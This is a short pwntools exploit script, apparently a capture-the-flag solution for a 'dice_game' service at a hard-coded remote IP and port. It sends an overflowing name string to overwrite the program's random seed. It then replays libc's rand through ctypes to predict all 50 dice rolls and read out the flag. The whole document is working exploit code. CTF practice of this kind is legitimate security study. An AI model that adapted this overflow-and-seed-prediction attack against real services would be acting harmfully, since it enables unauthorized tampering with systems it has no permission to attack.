
from pwn import *
import ctypes

libs = ctypes.CDLL('./libc.so.6')

# r = process('./dice_game')
r = remote('111.198.29.45', 38223)

r.recvuntil('name: ')
r.sendline('A' * 0x40 + p64(0xa))
libs.srand(0xa)

print('Please wait a moment...\n')
for i in range(50):
    r.recvuntil('point(1~6): ')
    a = libs.rand() % 6 + 1
    r.sendline(str(a))

print(r.readall())
